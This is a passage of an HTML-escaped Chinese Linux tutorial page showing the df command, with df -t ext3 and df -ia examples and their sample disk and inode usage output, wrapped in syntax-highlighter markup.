&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dev&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;sda9&lt;/span&gt;            &lt;span class=&quot;crayon-cn&quot;&gt;52592640&lt;/span&gt;   &lt;span class=&quot;crayon-cn&quot;&gt;50519&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;52542121&lt;/span&gt;    &lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;opt&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c970919086481248-8&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c970919086481248-9&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dev&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;sda8&lt;/span&gt;            &lt;span class=&quot;crayon-cn&quot;&gt;1280000&lt;/span&gt;    &lt;span class=&quot;crayon-cn&quot;&gt;8799&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;1271201&lt;/span&gt;    &lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;var&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c970919086481248-10&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c970919086481248-11&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dev&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;sda6&lt;/span&gt;            &lt;span class=&quot;crayon-cn&quot;&gt;5124480&lt;/span&gt;   &lt;span class=&quot;crayon-cn&quot;&gt;80163&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;5044317&lt;/span&gt;    &lt;span class=&quot;crayon-cn&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;usr&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c970919086481248-12&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c970919086481248-13&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dev&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;sda3&lt;/span&gt;             &lt;span class=&quot;crayon-cn&quot;&gt;255232&lt;/span&gt;      &lt;span class=&quot;crayon-cn&quot;&gt;34&lt;/span&gt;  &lt;span class=&quot;crayon-cn&quot;&gt;255198&lt;/span&gt;    &lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;boot&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c970919086481248-14&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c970919086481248-15&quot;&gt;
&lt;span class=&quot;crayon-i&quot;&gt;tmpfs&lt;/span&gt;                &lt;span class=&quot;crayon-cn&quot;&gt;4118303&lt;/span&gt;       &lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;4118302&lt;/span&gt;    &lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dev&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;shm&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0031 seconds] --&gt;
&lt;p&gt;说明：&lt;/p&gt;
&lt;p&gt;实例3：显示指定类型磁盘&lt;/p&gt;
&lt;p&gt;命令：&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587b12c97091d684498239&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;span class=&quot;crayon-language&quot;&gt;Shell&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
df -t ext3&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c97091d684498239-1&quot;&gt;1&lt;/div&gt;&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c97091d684498239-1&quot;&gt;
&lt;span class=&quot;crayon-r&quot;&gt;df&lt;/span&gt; &lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;t&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;ext3&lt;/span&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0005 seconds] --&gt;
&lt;p&gt;输出：&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587b12c970920179835737&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;span class=&quot;crayon-language&quot;&gt;Shell&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
[root@CT1190 log]# df -t ext3

文件系统               1K-块        已用     可用 已用% 挂载点

/dev/sda7             19840892    890896  17925856   5% /

/dev/sda9            203727156  93089700 100121712  49% /opt

/dev/sda8              4956284    570104   4130348  13% /var

/dev/sda6             19840892   1977568  16839184  11% /usr

/dev/sda3               988116     23880    913232   3% /boot&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c970920179835737-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c970920179835737-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c970920179835737-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c970920179835737-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c970920179835737-5&quot;&gt;5&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c970920179835737-6&quot;&gt;6&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c970920179835737-7&quot;&gt;7&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c970920179835737-8&quot;&gt;8&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c970920179835737-9&quot;&gt;9&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c970920179835737-10&quot;&gt;10&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c970920179835737-11&quot;&gt;11&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c970920179835737-12&quot;&gt;12&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c970920179835737-13&quot;&gt;13&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c970920179835737-1&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;CT1190&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;# df -t ext3&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c970920179835737-2&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c970920179835737-3&quot;&gt;文件系统               &lt;span class=&quot;crayon-cn&quot;&gt;1K&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;块        已用     可用 已用&lt;span class=&quot;crayon-o&quot;&gt;%&lt;/span&gt; 挂载点&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c970920179835737-4&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c970920179835737-5&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dev&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;sda7&lt;/span&gt;             &lt;span class=&quot;crayon-cn&quot;&gt;19840892&lt;/span&gt;    &lt;span class=&quot;crayon-cn&quot;&gt;890896&lt;/span&gt;  &lt;span class=&quot;crayon-cn&quot;&gt;17925856&lt;/span&gt;   &lt;span class=&quot;crayon-cn&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c970920179835737-6&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c970920179835737-7&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dev&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;sda9&lt;/span&gt;            &lt;span class=&quot;crayon-cn&quot;&gt;203727156&lt;/span&gt;  &lt;span class=&quot;crayon-cn&quot;&gt;93089700&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;100121712&lt;/span&gt;  &lt;span class=&quot;crayon-cn&quot;&gt;49&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;opt&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c970920179835737-8&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c970920179835737-9&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dev&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;sda8&lt;/span&gt;              &lt;span class=&quot;crayon-cn&quot;&gt;4956284&lt;/span&gt;    &lt;span class=&quot;crayon-cn&quot;&gt;570104&lt;/span&gt;   &lt;span class=&quot;crayon-cn&quot;&gt;4130348&lt;/span&gt;  &lt;span class=&quot;crayon-cn&quot;&gt;13&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;var&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c970920179835737-10&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c970920179835737-11&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dev&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;sda6&lt;/span&gt;             &lt;span class=&quot;crayon-cn&quot;&gt;19840892&lt;/span&gt;   &lt;span class=&quot;crayon-cn&quot;&gt;1977568&lt;/span&gt;  &lt;span class=&quot;crayon-cn&quot;&gt;16839184&lt;/span&gt;  &lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;usr&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c970920179835737-12&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c970920179835737-13&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dev&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;sda3&lt;/span&gt;               &lt;span class=&quot;crayon-cn&quot;&gt;988116&lt;/span&gt;     &lt;span class=&quot;crayon-cn&quot;&gt;23880&lt;/span&gt;    &lt;span class=&quot;crayon-cn&quot;&gt;913232&lt;/span&gt;   &lt;span class=&quot;crayon-cn&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;boot&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0027 seconds] --&gt;
&lt;p&gt;说明：&lt;/p&gt;
&lt;p&gt;实例4：列出各文件系统的i节点使用情况&lt;/p&gt;
&lt;p&gt;命令：&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587b12c970923056421209&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;span class=&quot;crayon-language&quot;&gt;Shell&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
df -ia&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c970923056421209-1&quot;&gt;1&lt;/div&gt;&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c970923056421209-1&quot;&gt;
&lt;span class=&quot;crayon-r&quot;&gt;df&lt;/span&gt; &lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;ia&lt;/span&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0004 seconds] --&gt;
&lt;p&gt;输出：&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587b12c970928516692009&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;span class=&quot;crayon-language&quot;&gt;Shell&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
[root@CT1190 log]# df -ia

文件系统               Inode (I)已用 (I)可用 (I)已用% 挂载点

/dev/sda7            5124480    5560 5118920    1%

/proc                       0       0       0    -  /proc

sysfs                      0       0       0    -  /sys

devpts                     0       0       0    -  /dev/pts

/dev/sda9            52592640   50519 52542121    1% /opt

/dev/sda8            1280000    8799 1271201    1% /var

/dev/sda6            5124480   80163 5044317    2% /usr

/dev/sda3             255232      34  255198    1% /boot

tmpfs                4118303       1 4118302    1% /dev/shm

none                       0       0       0    -  /proc/sys/fs/binfmt_misc&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c970928516692009-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c970928516692009-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c970928516692009-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c970928516692009-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c970928516692009-5&quot;&gt;5&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c970928516692009-6&quot;&gt;6&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c970928516692009-7&quot;&gt;7&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c970928516692009-8&quot;&gt;8&lt;/div&gt;
